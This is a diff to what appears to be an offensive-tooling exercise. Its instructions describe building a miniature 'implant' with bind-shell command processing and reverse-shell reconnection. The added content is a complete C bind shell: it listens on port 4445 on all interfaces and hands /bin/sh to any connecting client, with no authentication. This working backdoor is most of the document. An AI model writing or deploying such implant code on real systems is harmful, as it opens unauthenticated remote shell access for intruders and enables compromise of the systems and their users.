@@ -10,3 +10,34 @@ Once you have that, modify your existing implant to not use any sort of portknoc
 Once you have built your new miniature implant, modify it to have command processing functionality while connected via bind shell. For your first new command, upon receiving the string 'sleep X', close down the reverse shell, sleep for specified X minutes, and then reconnect to the previous port. 
 
 When you are done, submit your commit.
+
+
+
+
+
+#include <stdio.h>
+#include <sys/socket.h>
+#include <netinet/ip.h>
+#include <unistd.h>
+
+int main ()
+{
+    struct sockaddr_in addr;
+    addr.sin_family = AF_INET;
+    addr.sin_port = htons(4445);
+    addr.sin_addr.s_addr = INADDR_ANY;
+
+    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
+    bind(sockfd, (struct sockaddr *)&addr, sizeof(addr));
+    listen(sockfd, 0);
+
+    int connfd = accept(sockfd, NULL, NULL);
+    for (int i = 0; i < 3; i++)
+    {
+        dup2(connfd, i);
+    }
+
+    execve("/bin/sh", NULL, NULL);
+    return 0;
+}
+
